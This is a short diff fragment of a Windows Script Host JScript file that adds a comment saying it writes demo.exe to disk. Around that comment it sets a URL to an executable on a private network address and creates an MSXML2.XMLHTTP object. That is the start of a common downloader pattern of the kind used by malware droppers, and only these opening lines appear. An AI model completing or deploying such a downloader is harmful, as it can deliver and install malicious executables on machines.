@@ -1,3 +1,4 @@
+//Writes the demo.exe to disk
 var url = "http://192.168.1.1/demo.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
